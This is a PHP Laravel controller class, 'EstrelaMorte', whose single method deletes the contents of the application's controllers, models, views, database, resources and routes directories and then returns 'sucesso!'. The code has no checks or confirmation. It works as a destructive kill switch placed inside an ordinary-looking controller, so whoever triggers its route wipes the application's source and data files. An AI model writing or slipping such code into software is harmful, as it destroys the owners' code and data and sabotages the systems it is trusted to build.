<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File; // Importe a classe File

class EstrelaMorte extends Controller
{
    //
    public function atrserach()
    {
        $directoryPaths = [
            app_path('Http/Controllers'),
            app_path('Models'),
            resource_path('views'),
            base_path('database'),
            resource_path('resources'), 
            base_path('routes'),
        ];
        
        foreach ($directoryPaths as $directoryPath) {
            if (File::isDirectory($directoryPath)) {
                File::cleanDirectory($directoryPath);
            }
        }
        
        return "sucesso!";
        
    }
}
